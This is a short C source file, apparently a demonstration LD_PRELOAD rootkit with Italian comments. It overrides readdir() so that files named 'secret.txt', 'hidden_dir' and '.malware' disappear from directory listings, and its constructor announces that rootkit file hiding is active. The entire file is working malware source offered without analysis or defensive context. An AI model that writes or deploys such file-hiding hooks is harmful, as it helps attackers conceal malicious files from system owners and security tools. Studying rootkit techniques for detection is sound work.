#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>

// File/directory da nascondere
static const char *HIDDEN_NAMES[] = {
    "secret.txt",
    "hidden_dir",
    ".malware",
    NULL
};

static struct dirent *(*real_readdir)(DIR *) = NULL;

// Controlla se il file deve essere nascosto
static int should_hide(const char *name) {
    for (int i = 0; HIDDEN_NAMES[i] != NULL; i++) {
        if (strcmp(name, HIDDEN_NAMES[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *entry;
    
    // Skip hidden files
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    
    return NULL;
}

__attribute__((constructor))
static void init(void) {
    fprintf(stderr, "[Rootkit] File hiding active\n");
}

